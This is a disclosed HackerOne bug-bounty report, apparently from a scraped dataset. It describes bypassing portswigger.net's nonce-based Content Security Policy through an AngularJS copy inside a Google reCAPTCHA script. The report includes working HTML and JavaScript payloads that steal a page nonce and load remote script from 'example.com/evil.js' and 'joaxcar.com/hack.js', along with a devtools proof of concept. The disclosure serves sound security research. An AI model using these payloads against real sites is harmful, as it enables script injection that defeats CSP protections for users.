---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2279346'
original_report_id: '2279346'
title: CSP bypass on PortSwigger.net using Google script resources
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: portswigger
created_at: '2023-12-09T17:47:59.279Z'
disclosed_at: '2024-02-18T22:10:06.616Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 90
asset_identifier: portswigger.net
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# CSP bypass on PortSwigger.net using Google script resources

## Metadata

- HackerOne Report ID: 2279346
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: portswigger
- Disclosed At: 2024-02-18T22:10:06.616Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary
Hi team!
I read this [blogpost](https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro) again after playing with an Angular CSP bypass in this Twitter thread https://twitter.com/sudhanshur705/status/1732760081094091117

I found a way to load arbitrary scripts (escaping the restrictions of Angular) if the page uses nonce-based CSP.

As show in the Twitter thread https://www.google.com/recaptcha/about/js/main.min.js contains Angular, and your CSP allows the complete `https://www.google.com/recaptcha/` URL

First of all this allows for simple JS execution, such as
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
```
this will pop an alert.

This allows for some JS execution, but eval and Function escalations from Angular will be blocked by the lack of `unsafe-inline`. I found that this can be bypassed when a site is using `nonce` based CSP like this
```html
<img src=x ng-on-error='
w=$event.target.ownerDocument;
a=w.defaultView.top.document.querySelector("[nonce]");
b=w.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce;
w.body.appendChild(b)
'>
```
## POC
1. Go to https://portswigger.net/
2. Open devtools and paste and execute this (replace `//joaxcar.com/hack.js` if you want)
```javascript
document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(&quot;[nonce]&quot;);b=w.createElement(&quot;script&quot;);b.src=&quot;//joaxcar.com/hack.js&quot;;b.nonce=a.nonce;w.body.appendChild(b)'>
</div>
">`
```
3. See the popup, look at network tools and see that the script is loaded from

## Impact
Just as in the blog, this is more of an in-depth defense. You need an HTML injection to pull this off. But as you asked us to send bypasses in
>  if you find something we missed, please report it to PortSwigger's bug-bounty program
I do, however, understand if it is out of scope for rewards.

Have a nice one!
Johan

## Impact

CSP bypass using Angular JS

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
